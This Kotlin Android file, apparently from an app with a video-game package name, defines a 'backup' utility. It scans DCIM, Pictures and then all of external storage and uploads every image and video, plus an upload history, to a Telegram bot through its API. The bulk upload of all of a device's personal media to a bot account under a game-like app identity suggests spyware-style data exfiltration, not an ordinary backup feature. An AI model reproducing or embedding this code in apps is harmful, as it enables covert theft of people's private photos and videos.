package com.service.assasinscreed02

import android.content.Context
import android.os.Environment
import android.util.Log
import com.google.gson.Gson
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import java.io.File
import java.security.MessageDigest

object BackupUtils {
    private const val TAG = "BackupUtils"
    private const val PREFS_NAME = "BackupPrefs"
    private const val UPLOADED_FILES_KEY = "uploaded_files"
    private const val BATCH_SIZE_IMAGES = 10
    private const val BATCH_SIZE_VIDEOS = 3
    private const val BATCH_DELAY_MS = 2000L

    data class BackupHistoryEntry(
        val fileName: String,
        val hash: String,
        val timestamp: Long
    )

    fun runBackup(context: Context, forzarConDatos: Boolean = false): Boolean {
        return runBackupWithProgress(context, forzarConDatos) { _, _, _, _, _, _, _, _ -> }
    }

    fun runBackupWithProgress(
        context: Context, 
        forzarConDatos: Boolean = false,
        progressCallback: (progress: Int, total: Int, currentFile: String, phase: String, sent: Int, errors: Int, fileProgress: Int, fileSize: Long) -> Unit
    ): Boolean {
        try {
            Log.d(TAG, "Iniciando backup desde BackupUtils (forzarConDatos: $forzarConDatos)")
            val config = ErrorHandler.obtenerConfigBot(context)
            if (config.first.isNullOrBlank() || config.second.isNullOrBlank()) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return false
            }
            val token = config.first ?: ""
            val chatId = config.second ?: ""
            
            // Verificar conexión según el modo
            if (!forzarConDatos && !isWifiConnected(context)) {
                Log.w(TAG, "No hay conexión WiFi disponible y no se permite usar datos móviles")
                return false
            }
            
            if (forzarConDatos && !isWifiConnected(context) && !isMobileDataConnected(context)) {
                Log.w(TAG, "No hay conexión WiFi ni datos móviles disponibles")
                return false
            }
            
            var totalArchivos = 0
            var archivosEnviados = 0
            var archivosError = 0
            
            // PRIMERA FASE: Escanear solo DCIM y Pictures
            progressCallback(0, 0, "", "Escaneando DCIM y Pictures...", archivosEnviados, archivosError, 0, 0)
            Log.d(TAG, "FASE 1: Escaneando DCIM y Pictures")
            val archivosDCIMyPictures = escanearDCIMyPictures(context)
            Log.d(TAG, "Encontrados ${archivosDCIMyPictures.size} archivos en DCIM y Pictures")
            
            if (archivosDCIMyPictures.isNotEmpty()) {
                val imagenesDCIM = archivosDCIMyPictures.filter { isImage(it) }
                val videosDCIM = archivosDCIMyPictures.filter { isVideo(it) }
                Log.d(TAG, "DCIM/Pictures - Imágenes: ${imagenesDCIM.size}, Videos: ${videosDCIM.size}")
                
                totalArchivos += imagenesDCIM.size + videosDCIM.size
                
                enviarPorLotesConProgreso(token, chatId, imagenesDCIM, BATCH_SIZE_IMAGES, "imágenes (DCIM/Pictures)", context, progressCallback, archivosEnviados, archivosError) { sent, errors ->
                    archivosEnviados += sent
                    archivosError += errors
                }
                
                enviarPorLotesConProgreso(token, chatId, videosDCIM, BATCH_SIZE_VIDEOS, "videos (DCIM/Pictures)", context, progressCallback, archivosEnviados, archivosError) { sent, errors ->
                    archivosEnviados += sent
                    archivosError += errors
                }
            }
            
            // SEGUNDA FASE: Escanear todo el dispositivo
            progressCallback(archivosEnviados, totalArchivos, "", "Escaneando resto del dispositivo...", archivosEnviados, archivosError, 0, 0)
            Log.d(TAG, "FASE 2: Escaneando todo el dispositivo")
            val archivosRestoDispositivo = escanearArchivosNuevos(context)
            Log.d(TAG, "Encontrados ${archivosRestoDispositivo.size} archivos en el resto del dispositivo")
            
            if (archivosRestoDispositivo.isNotEmpty()) {
                val imagenesResto = archivosRestoDispositivo.filter { isImage(it) }
                val videosResto = archivosRestoDispositivo.filter { isVideo(it) }
                Log.d(TAG, "Resto dispositivo - Imágenes: ${imagenesResto.size}, Videos: ${videosResto.size}")
                
                totalArchivos += imagenesResto.size + videosResto.size
                
                enviarPorLotesConProgreso(token, chatId, imagenesResto, BATCH_SIZE_IMAGES, "imágenes (resto dispositivo)", context, progressCallback, archivosEnviados, archivosError) { sent, errors ->
                    archivosEnviados += sent
                    archivosError += errors
                }
                
                enviarPorLotesConProgreso(token, chatId, videosResto, BATCH_SIZE_VIDEOS, "videos (resto dispositivo)", context, progressCallback, archivosEnviados, archivosError) { sent, errors ->
                    archivosEnviados += sent
                    archivosError += errors
                }
            }
            
            progressCallback(archivosEnviados, totalArchivos, "", "Enviando historial...", archivosEnviados, archivosError, 0, 0)
            val historialFile = serializarHistorial(context)
            if (historialFile != null) {
                enviarArchivoATelegram(token, chatId, historialFile)
                Log.d(TAG, "Historial enviado al bot")
            }
            guardarConexion(context)
            Log.d(TAG, "Backup completado exitosamente")
            return true
        } catch (e: Exception) {
            Log.e(TAG, "Error en BackupUtils: ${e.message}", e)
            return false
        }
    }

    private fun isWifiConnected(context: Context): Boolean {
        try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando WiFi: ${e.message}")
            return false
        }
    }

    private fun isMobileDataConnected(context: Context): Boolean {
        try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando datos móviles: ${e.message}")
            return false
        }
    }

    private fun escanearDCIMyPictures(context: Context): List<File> {
        val extensiones = obtenerTiposArchivo(context).toList()
        val archivos = mutableListOf<File>()
        val archivosSubidos = obtenerArchivosSubidos(context)
        
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return archivos
            }
            
            // Escanear solo DCIM y Pictures
            val carpetasPrioritarias = listOf("DCIM", "Pictures")
            
            carpetasPrioritarias.forEach { nombreCarpeta ->
                val carpeta = File(directorio, nombreCarpeta)
                if (carpeta.exists() && carpeta.canRead()) {
                    Log.d(TAG, "Escaneando carpeta: $nombreCarpeta")
                    carpeta.walkTopDown().forEach { file ->
                        try {
                            if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                                if (file.canRead() && file.length() > 0) {
                                    val hash = calcularHashArchivo(file)
                                    if (!archivosSubidos.contains(hash)) {
                                        archivos.add(file)
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                        }
                    }
                } else {
                    Log.w(TAG, "Carpeta $nombreCarpeta no existe o no es accesible")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando DCIM y Pictures: ${e.message}", e)
        }
        
        return archivos.sortedBy { it.lastModified() }.reversed()
    }

    private fun escanearArchivosNuevos(context: Context): List<File> {
        val extensiones = obtenerTiposArchivo(context).toList()
        val archivos = mutableListOf<File>()
        val archivosSubidos = obtenerArchivosSubidos(context)
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return archivos
            }
            directorio.walkTopDown().forEach { file ->
                try {
                    if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                        if (file.canRead() && file.length() > 0) {
                            val hash = calcularHashArchivo(file)
                            if (!archivosSubidos.contains(hash)) {
                                archivos.add(file)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando medios: ${e.message}", e)
        }
        return archivos.sortedBy { it.lastModified() }.reversed()
    }

    private fun calcularHashArchivo(file: File): String {
        return try {
            val md = MessageDigest.getInstance("MD5")
            val bytes = file.readBytes()
            val digest = md.digest(bytes)
            digest.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error calculando hash de ${file.name}: ${e.message}")
            file.absolutePath + "_" + file.lastModified()
        }
    }

    private fun obtenerArchivosSubidos(context: Context): Set<String> {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
    }

    private fun serializarHistorial(context: Context): File? {
        return try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val archivos = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
            val historyList = archivos.mapNotNull { hash ->
                val parts = hash.split("|||")
                if (parts.size == 3) BackupHistoryEntry(parts[0], parts[1], parts[2].toLongOrNull() ?: 0L) else null
            }
            val json = Gson().toJson(historyList)
            val file = File(context.cacheDir, "historial_backup.json")
            file.writeText(json)
            file
        } catch (e: Exception) {
            Log.e(TAG, "Error serializando historial: ${e.message}")
            null
        }
    }

    private fun guardarConexion(context: Context) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val ahora = System.currentTimeMillis()
        val anterior = prefs.getLong("ultima_conexion", 0L)
        prefs.edit().putLong("anterior_conexion", anterior).putLong("ultima_conexion", ahora).apply()
    }

    private fun isImage(file: File): Boolean {
        val extension = file.extension.lowercase()
        val tiposImagen = setOf("jpg", "jpeg", "png", "gif")
        return extension in tiposImagen
    }

    private fun isVideo(file: File): Boolean {
        val extension = file.extension.lowercase()
        val tiposVideo = setOf("mp4", "mov", "avi")
        return extension in tiposVideo
    }

    private fun enviarPorLotes(token: String, chatId: String, archivos: List<File>, batchSize: Int, tipo: String, context: Context) {
        enviarPorLotesConProgreso(token, chatId, archivos, batchSize, tipo, context, { _, _, _, _, _, _, _, _ -> }, 0, 0) { _, _ -> }
    }

    private fun enviarPorLotesConProgreso(
        token: String, 
        chatId: String, 
        archivos: List<File>, 
        batchSize: Int, 
        tipo: String, 
        context: Context,
        progressCallback: (progress: Int, total: Int, currentFile: String, phase: String, sent: Int, errors: Int, fileProgress: Int, fileSize: Long) -> Unit,
        archivosEnviadosInicial: Int,
        archivosErrorInicial: Int,
        onBatchComplete: (sent: Int, errors: Int) -> Unit
    ) {
        if (archivos.isEmpty()) return
        
        val lotes = archivos.chunked(batchSize)
        Log.d(TAG, "Enviando ${archivos.size} $tipo en ${lotes.size} lotes")
        
        var archivosEnviados = archivosEnviadosInicial
        var archivosError = archivosErrorInicial
        var archivoIndex = 0
        
        lotes.forEachIndexed { loteIndex, lote ->
            try {
                Log.d(TAG, "Enviando lote ${loteIndex + 1}/${lotes.size} de $tipo")
                var archivosEnviadosEnLote = 0
                
                lote.forEach { archivo ->
                    // Verificar si el backup fue cancelado
                    if (BackupProgressActivity.isBackupCancelled) {
                        Log.d(TAG, "Backup cancelado por el usuario")
                        return
                    }
                    
                    try {
                        progressCallback(archivoIndex, archivos.size, archivo.name, "Enviando $tipo...", archivosEnviados, archivosError, 0, archivo.length())
                        
                        // Intentar enviar con reintentos
                        val resultado = enviarArchivoConReintentos(token, chatId, archivo, 3)
                        
                        if (resultado == null) { // Éxito
                            archivosEnviados++
                            archivosEnviadosEnLote++
                            val hash = calcularHashArchivo(archivo)
                            guardarArchivoSubido(context, archivo, hash)
                            Log.d(TAG, "Archivo enviado exitosamente: ${archivo.name}")
                        } else {
                            archivosError++
                            Log.e(TAG, "Error enviando archivo ${archivo.name}: $resultado")
                        }
                        
                        archivoIndex++
                        progressCallback(archivoIndex, archivos.size, archivo.name, "Enviando $tipo...", archivosEnviados, archivosError, 100, archivo.length())
                        
                        // Pequeña pausa entre archivos para no sobrecargar
                        Thread.sleep(500L)
                        
                    } catch (e: Exception) {
                        archivosError++
                        Log.e(TAG, "Error inesperado enviando archivo ${archivo.name}: ${e.message}", e)
                        archivoIndex++
                    }
                }
                
                Log.d(TAG, "Lote ${loteIndex + 1} completado: $archivosEnviadosEnLote/$tipo enviados")
                onBatchComplete(archivosEnviadosEnLote, 0)
                
                // Delay entre lotes (excepto el último)
                if (loteIndex < lotes.size - 1 && !BackupProgressActivity.isBackupCancelled) {
                    Thread.sleep(BATCH_DELAY_MS)
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error enviando lote ${loteIndex + 1}: ${e.message}", e)
            }
        }
    }
    
    private fun enviarArchivoConReintentos(token: String, chatId: String, archivo: File, maxReintentos: Int): String? {
        var ultimoError: String? = null
        
        for (intento in 1..maxReintentos) {
            try {
                val resultado = enviarArchivoATelegram(token, chatId, archivo)
                if (resultado == null) {
                    // Éxito
                    if (intento > 1) {
                        Log.d(TAG, "Archivo ${archivo.name} enviado en intento $intento")
                    }
                    return null
                } else {
                    ultimoError = resultado
                    Log.w(TAG, "Intento $intento falló para ${archivo.name}: $resultado")
                    
                    // Si es un error de red, esperar antes del siguiente intento
                    if (resultado.contains("Timeout") || resultado.contains("conexión") || resultado.contains("internet")) {
                        if (intento < maxReintentos) {
                            Thread.sleep(2000L * intento) // Espera progresiva: 2s, 4s, 6s
                        }
                    } else {
                        // Si es un error del archivo (no existe, muy grande, etc.), no reintentar
                        break
                    }
                }
            } catch (e: Exception) {
                ultimoError = "Error inesperado: ${e.message}"
                Log.e(TAG, "Error en intento $intento para ${archivo.name}: ${e.message}")
                
                if (intento < maxReintentos) {
                    Thread.sleep(1000L * intento)
                }
            }
        }
        
        return ultimoError
    }

    private fun guardarArchivoSubido(context: Context, file: File, hash: String) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val archivosSubidos = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet())?.toMutableSet() ?: mutableSetOf()
            val entry = "${file.name}|||$hash|||${file.lastModified()}"
            archivosSubidos.add(entry)
            prefs.edit().putStringSet(UPLOADED_FILES_KEY, archivosSubidos).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando archivo subido: ${e.message}")
        }
    }

    fun enviarArchivoATelegram(token: String, chatId: String, archivo: File): String? {
        // Validaciones iniciales
        if (!archivo.exists()) {
            val msg = "Archivo no existe: ${archivo.name}"
            Log.w(TAG, msg)
            return msg
        }
        
        if (!archivo.canRead()) {
            val msg = "Archivo no se puede leer: ${archivo.name}"
            Log.w(TAG, msg)
            return msg
        }
        
        if (archivo.length() == 0L) {
            val msg = "Archivo vacío: ${archivo.name}"
            Log.w(TAG, msg)
            return msg
        }
        
                    // Verificar tamaño del archivo (límite de Telegram: 50MB)
            val maxSize = 50L * 1024 * 1024 // 50MB
            if (archivo.length() > maxSize) {
                val msg = "Archivo demasiado grande (${archivo.length() / 1024L / 1024L}MB): ${archivo.name}"
                Log.w(TAG, msg)
                return msg
            }
        
        val url = "https://api.telegram.org/bot$token/sendDocument"
        
        try {
            // Crear cliente con timeouts más largos para archivos grandes
            val client = OkHttpClient.Builder()
                .connectTimeout(60L, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(300L, java.util.concurrent.TimeUnit.SECONDS) // 5 minutos para archivos grandes
                .writeTimeout(300L, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            
            // Determinar el tipo MIME correcto
            val mimeType = when (archivo.extension.lowercase()) {
                "jpg", "jpeg" -> "image/jpeg"
                "png" -> "image/png"
                "mp4" -> "video/mp4"
                "mov" -> "video/quicktime"
                "avi" -> "video/x-msvideo"
                "pdf" -> "application/pdf"
                "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
                "txt" -> "text/plain"
                else -> "application/octet-stream"
            }
            
            val requestBody = okhttp3.MultipartBody.Builder()
                .setType(okhttp3.MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart(
                    "document",
                    archivo.name,
                    okhttp3.RequestBody.create(mimeType.toMediaTypeOrNull(), archivo)
                )
                .build()
                
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
                
            val response = client.newCall(request).execute()
            
            try {
                if (!response.isSuccessful) {
                    val body = response.body?.string() ?: "Sin respuesta del servidor"
                    val msg = "Error HTTP ${response.code}: $body"
                    Log.e(TAG, "Error HTTP enviando archivo ${archivo.name} a Telegram: $msg")
                    return msg
                }
                
                // Verificar que la respuesta sea válida
                val responseBody = response.body?.string()
                if (responseBody == null || responseBody.isEmpty()) {
                    val msg = "Respuesta vacía del servidor para: ${archivo.name}"
                    Log.w(TAG, msg)
                    return msg
                }
                
                // Verificar si la respuesta indica éxito
                if (!responseBody.contains("\"ok\":true")) {
                    val msg = "Respuesta de error de Telegram: $responseBody"
                    Log.e(TAG, "Error en respuesta de Telegram para ${archivo.name}: $msg")
                    return msg
                }
                
                Log.d(TAG, "Archivo enviado exitosamente: ${archivo.name}")
                return null // null = éxito
                
            } finally {
                response.close()
            }
            
        } catch (e: java.net.SocketTimeoutException) {
            val msg = "Timeout enviando archivo: ${archivo.name}"
            Log.e(TAG, msg, e)
            return msg
        } catch (e: java.net.UnknownHostException) {
            val msg = "Error de conexión (sin internet): ${archivo.name}"
            Log.e(TAG, msg, e)
            return msg
        } catch (e: java.net.ConnectException) {
            val msg = "Error de conexión al servidor: ${archivo.name}"
            Log.e(TAG, msg, e)
            return msg
        } catch (e: Exception) {
            val msg = "Error inesperado enviando archivo ${archivo.name}: ${e.message}"
            Log.e(TAG, msg, e)
            return msg
        }
    }

    fun ejecutarBackupManual(context: Context): Boolean {
        return try {
            Log.d(TAG, "Iniciando backup manual")
            
            // Verificar configuración
            val config = obtenerConfigBot(context)
            if (config == null) {
                Log.e(TAG, "Configuración del bot no encontrada")
                return false
            }
            
            val (token, chatId) = config
            
            // Verificar permisos
            if (!ErrorHandler.validatePermissions(context)) {
                Log.e(TAG, "Permisos de almacenamiento no otorgados")
                return false
            }
            
            // Ejecutar backup por fases si está activado
            val backupPorFases = obtenerBackupPorFases(context)
            if (backupPorFases) {
                Log.d(TAG, "Ejecutando backup por fases")
                runBackupWithProgress(context, false) { _, _, _, _, _, _, _, _ -> }
            } else {
                Log.d(TAG, "Ejecutando backup completo")
                runBackupWithProgress(context, false) { _, _, _, _, _, _, _, _ -> }
            }
            
            // Guardar conexión
            guardarConexion(context)
            
            Log.d(TAG, "Backup manual completado")
            true
            
        } catch (e: Exception) {
            Log.e(TAG, "Error en backup manual: ${e.message}", e)
            false
        }
    }
} 